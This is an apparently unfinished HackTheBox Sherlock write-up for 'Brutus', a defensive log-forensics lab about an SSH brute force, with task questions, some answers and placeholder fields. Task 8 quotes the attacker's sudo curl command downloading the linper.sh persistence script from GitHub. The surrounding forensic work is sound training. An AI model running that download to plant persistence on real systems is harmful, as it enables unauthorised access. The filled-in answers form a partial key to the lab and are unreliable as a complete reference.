---
link: https://app.hackthebox.com/sherlocks/Brutus
description: Very Easy
release date: 2024-04-04
tags:
image: https://cdn.services-k8s.prod.aws.htb.systems/content/sherlocks/avatar/9e4d9103-d723-4062-b57f-0a001833056e.png
solved:
solve date:
machine no.:
---
<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/HTB Logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">"Sherlock Name" Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/sherlocks/avatar/9e4d9103-d723-4062-b57f-0a001833056e.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 18px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): "htb username"</p>
    <p style="margin: 0;">Difficulty: Easy/Medium/Hard/Insane</p>
    <p style="margin: 0;">Date: DD Month Year</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Summary

### What a Sherlock actually is

Up to now we've been doing **machines** and in machines you're the attacker. You enumerate, find a foothold, exploit, escalate, grab `user.txt` and `root.txt`. The flag is _proof you broke in_.

A Sherlock flips the process we're used to when we do Machines. The box is already compromised. Someone hands you a bag of artifacts — logs, a memory dump, a PCAP, an MFT, Windows event logs — and your job is to _reconstruct what happened_. The "flag" isn't a hash you capture; it's **knowledge**: the attacker's IP, the account they cracked, the exact second they logged in, the technique they used for persistence. You're answering _who, what, when, where, how_ against evidence.

And I think the single most useful framing is **every offensive action you've ever run on a machine leaves a trace on the defender's side.** For example brute-forced SSH, logins all attacker activity on a hundred boxes — tonight you see what those 48 failed attempts _look like in a log_.

| SECTION/TASK | FLAG |
| ------------ | ---- |
|              |      |
|              |      |

- 7z 
- why utmpdump doesn't work even if you intsll it with the disignate command
- what does `Invalid user admin` mean?
- `systemd-logind`
- before starting any of the questions: `auth.log` and `wtmp` summary 
- an intro to sherlocks & things workth menioning for first timers like you don't have to do the tasks inorder
- considering this is a very easy sherlock I want it to be as comprehensive as possible
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## Task 1

Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?
==65.2.161.68==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>
<div style="page-break-after: always;"></div>

## Task 2

The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?
==root==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>
<div style="page-break-after: always;"></div>

## Task 3

Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.
==Answer==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>
<div style="page-break-after: always;"></div>

## Task 4

SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
==Answer==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>
<div style="page-break-after: always;"></div>

## Task 5

The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
==cyberjunkie==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>
<div style="page-break-after: always;"></div>

## Task 6

What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
==T1136.001==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>
<div style="page-break-after: always;"></div>

## Task 7

What time did the attacker's first SSH session end according to auth.log?
==2024-03-06 06:37:24==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>
<div style="page-break-after: always;"></div>

## Task 8

The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
==/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>
<div style="page-break-after: always;"></div>

## References

